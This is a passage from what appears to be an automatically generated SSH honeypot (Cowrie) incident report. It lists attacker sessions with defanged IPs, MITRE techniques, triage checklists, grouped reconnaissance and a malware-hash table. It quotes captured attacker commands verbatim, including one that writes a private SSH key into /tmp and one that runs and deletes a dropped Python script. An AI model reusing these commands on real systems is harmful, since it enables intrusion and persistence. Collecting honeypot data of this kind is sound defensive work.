| `2026-10-12 00:46:57` | `cowrie.session.params` |
| `2026-10-12 00:46:57` | `cowrie.command.input` |
| `2026-10-12 00:46:57` | `cowrie.session.file_download` |
| `2026-10-12 00:46:57` | `cowrie.log.closed` |
| `2026-10-12 00:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.204.74[.]149` to AbuseIPDB if not already reported
- [ ] Block `49.204.74[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1093e5d2af92

| Field | Detail |
|---|---|
| **Source IP** | `49.204.74[.]149` |
| **First Seen** | 2026-10-12 00:46 |
| **Last Seen** | 2026-10-12 00:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:46:57` | `cowrie.session.connect` |
| `2026-10-12 00:46:57` | `cowrie.client.version` |
| `2026-10-12 00:46:58` | `cowrie.client.kex` |
| `2026-10-12 00:46:59` | `cowrie.login.success` |
| `2026-10-12 00:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.204.74[.]149` to AbuseIPDB if not already reported
- [ ] Block `49.204.74[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e58dfa236d7c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]149` |
| **First Seen** | 2026-10-12 00:49 |
| **Last Seen** | 2026-10-12 00:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:49:06` | `cowrie.session.connect` |
| `2026-10-12 00:49:06` | `cowrie.client.version` |
| `2026-10-12 00:49:06` | `cowrie.client.kex` |
| `2026-10-12 00:49:06` | `cowrie.login.success` |
| `2026-10-12 00:49:07` | `cowrie.session.params` |
| `2026-10-12 00:49:07` | `cowrie.command.input` |
| `2026-10-12 00:49:07` | `cowrie.log.closed` |
| `2026-10-12 00:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]149` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f8fcc1cb36

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-12 00:52 |
| **Last Seen** | 2026-10-12 00:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:52:40` | `cowrie.session.connect` |
| `2026-10-12 00:52:40` | `cowrie.client.version` |
| `2026-10-12 00:52:40` | `cowrie.client.kex` |
| `2026-10-12 00:52:40` | `cowrie.login.success` |
| `2026-10-12 00:52:41` | `cowrie.direct-tcpip.request` |
| `2026-10-12 00:52:41` | `cowrie.direct-tcpip.data` |
| `2026-10-12 00:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c911b2d6d1b

| Field | Detail |
|---|---|
| **Source IP** | `103.159.51[.]70` |
| **First Seen** | 2026-10-12 01:02 |
| **Last Seen** | 2026-10-12 01:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 01:02:51` | `cowrie.session.connect` |
| `2026-10-12 01:02:51` | `cowrie.client.version` |
| `2026-10-12 01:02:51` | `cowrie.client.kex` |
| `2026-10-12 01:02:53` | `cowrie.login.success` |
| `2026-10-12 01:02:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.159.51[.]70` to AbuseIPDB if not already reported
- [ ] Block `103.159.51[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9676e42189bd

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-10-12 01:02 |
| **Last Seen** | 2026-10-12 01:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e, 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 01:02:54` | `cowrie.session.connect` |
| `2026-10-12 01:02:54` | `cowrie.client.version` |
| `2026-10-12 01:02:54` | `cowrie.client.kex` |
| `2026-10-12 01:02:54` | `cowrie.login.success` |
| `2026-10-12 01:02:56` | `cowrie.session.params` |
| `2026-10-12 01:02:56` | `cowrie.command.input` |
| `2026-10-12 01:02:56` | `cowrie.session.file_download` |
| `2026-10-12 01:02:56` | `cowrie.session.file_download` |
| `2026-10-12 01:02:56` | `cowrie.log.closed` |
| `2026-10-12 01:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff4892201d21

| Field | Detail |
|---|---|
| **Source IP** | `36.137.242[.]65` |
| **First Seen** | 2026-10-12 01:05 |
| **Last Seen** | 2026-10-12 01:06 |
| **Session Duration** | 94s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 01:05:03` | `cowrie.session.connect` |
| `2026-10-12 01:05:03` | `cowrie.client.version` |
| `2026-10-12 01:05:04` | `cowrie.client.kex` |
| `2026-10-12 01:06:36` | `cowrie.login.success` |
| `2026-10-12 01:06:37` | `cowrie.session.params` |
| `2026-10-12 01:06:37` | `cowrie.command.input` |
| `2026-10-12 01:06:37` | `cowrie.log.closed` |
| `2026-10-12 01:06:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.137.242[.]65` to AbuseIPDB if not already reported
- [ ] Block `36.137.242[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c59c870287

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-10-12 02:11 |
| **Last Seen** | 2026-10-12 02:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 02:11:40` | `cowrie.session.connect` |
| `2026-10-12 02:11:41` | `cowrie.client.version` |
| `2026-10-12 02:11:41` | `cowrie.client.kex` |
| `2026-10-12 02:11:41` | `cowrie.login.success` |
| `2026-10-12 02:11:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0a202626d87

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-10-12 02:11 |
| **Last Seen** | 2026-10-12 02:13 |
| **Session Duration** | 127s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 02:11:46` | `cowrie.session.connect` |
| `2026-10-12 02:11:46` | `cowrie.client.version` |
| `2026-10-12 02:11:47` | `cowrie.client.kex` |
| `2026-10-12 02:11:47` | `cowrie.login.success` |
| `2026-10-12 02:11:48` | `cowrie.session.file_upload` |
| `2026-10-12 02:11:49` | `cowrie.session.params` |
| `2026-10-12 02:11:49` | `cowrie.command.input` |
| `2026-10-12 02:11:49` | `cowrie.command.input` |
| `2026-10-12 02:11:49` | `cowrie.command.input` |
| `2026-10-12 02:11:49` | `cowrie.command.failed` |
| `2026-10-12 02:11:49` | `cowrie.log.closed` |
| `2026-10-12 02:11:50` | `cowrie.session.params` |
| `2026-10-12 02:11:50` | `cowrie.command.input` |
| `2026-10-12 02:11:50` | `cowrie.log.closed` |
| `2026-10-12 02:11:51` | `cowrie.session.params` |
| … | _9 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5272b8fb6aae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-10-12 02:28 |
| **Last Seen** | 2026-10-12 02:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 02:28:35` | `cowrie.session.connect` |
| `2026-10-12 02:28:36` | `cowrie.client.version` |
| `2026-10-12 02:28:36` | `cowrie.client.kex` |
| `2026-10-12 02:28:38` | `cowrie.login.success` |
| `2026-10-12 02:28:40` | `cowrie.session.params` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| `2026-10-12 02:28:40` | `cowrie.command.success` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| `2026-10-12 02:28:40` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🟡 MEDIUM · IR-2f5b40e1de10

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]150` |
| **First Seen** | 2026-10-12 00:00 |
| **Last Seen** | 2026-10-12 00:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 0 |
| **Auth Success** | ❌ No |
| **Commands Executed** | `uname -s -v -n -r -m` |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-12 00:00:00` | `cowrie.session.params` |
| `2026-10-12 00:00:00` | `cowrie.command.input` |
| `2026-10-12 00:00:00` | `cowrie.log.closed` |
| `2026-10-12 00:00:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Monitor for repeat activity from `77.239.124[.]150`
- [ ] No immediate escalation required

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **2** | 2026-10-12 00:01 | 2026-10-12 02:02 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-12 00:06 | 2026-10-12 02:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `220.79.193[.]19` | **2** | 2026-10-12 01:47 | 2026-10-12 02:53 | 2m | 0 | `T1592` | 🟢 LOW |
| `222.113.196[.]55` | **2** | 2026-10-12 00:55 | 2026-10-12 02:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.202[.]48` | 1 | 2026-10-12 00:04 | 2026-10-12 00:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `107.178.7[.]126` | 1 | 2026-10-12 00:59 | 2026-10-12 00:59 | 30s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]149` | 1 | 2026-10-12 00:48 | 2026-10-12 00:48 | 8s | 0 | `T1592` | 🟢 LOW |
| `113.117.242[.]174` | 1 | 2026-10-12 00:04 | 2026-10-12 00:04 | 16s | 0 | `T1592` | 🟢 LOW |
| `113.117.242[.]174` | 1 | 2026-10-12 02:06 | 2026-10-12 02:06 | 19s | 0 | `T1592` | 🟢 LOW |
| `118.47.81[.]207` | 1 | 2026-10-12 01:38 | 2026-10-12 01:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-12 02:30 | 2026-10-12 02:31 | 56s | 0 | `T1592` | 🟢 LOW |
| `14.34.5[.]148` | 1 | 2026-10-12 00:32 | 2026-10-12 00:33 | 24s | 0 | `T1592` | 🟢 LOW |
| `14.49.180[.]118` | 1 | 2026-10-12 01:22 | 2026-10-12 01:22 | 28s | 0 | `T1592` | 🟢 LOW |
| `169.212.149[.]252` | 1 | 2026-10-12 01:50 | 2026-10-12 01:50 | 25s | 0 | `T1592` | 🟢 LOW |
| `174.138.49[.]97` | 1 | 2026-10-12 01:29 | 2026-10-12 01:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.253.205[.]236` | 1 | 2026-10-12 00:12 | 2026-10-12 00:12 | 16s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]54` | 1 | 2026-10-12 02:43 | 2026-10-12 02:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.194.41[.]69` | 1 | 2026-10-12 01:05 | 2026-10-12 01:05 | 20s | 0 | `T1592` | 🟢 LOW |
| `218.150.210[.]141` | 1 | 2026-10-12 01:15 | 2026-10-12 01:15 | 15s | 0 | `T1592` | 🟢 LOW |
| `3.91.61[.]197` | 1 | 2026-10-12 01:21 | 2026-10-12 01:21 | 1s | 0 | `T1592` | 🟢 LOW |
| `36.133.214[.]135` | 1 | 2026-10-12 01:03 | 2026-10-12 01:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.137.242[.]65` | 1 | 2026-10-12 01:05 | 2026-10-12 01:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.240.164[.]208` | 1 | 2026-10-12 00:13 | 2026-10-12 00:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.156.128[.]62` | 1 | 2026-10-12 01:07 | 2026-10-12 01:07 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-10-12 02:46 | 2026-10-12 02:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `47.204.10[.]10` | 1 | 2026-10-12 00:26 | 2026-10-12 00:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.29.125[.]69` | 1 | 2026-10-12 02:42 | 2026-10-12 02:42 | 21s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-10-12 01:35 | 2026-10-12 01:35 | 4s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]150` | 1 | 2026-10-12 00:01 | 2026-10-12 00:01 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `85.138.110[.]229` | 1 | 2026-10-12 02:28 | 2026-10-12 02:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]29` | 1 | 2026-10-12 01:09 | 2026-10-12 01:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-12 02:35 | 2026-10-12 02:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-10-12 00:26 | 2026-10-12 00:26 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.188.91[.]101` | 1 | 2026-10-12 00:01 | 2026-10-12 00:03 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
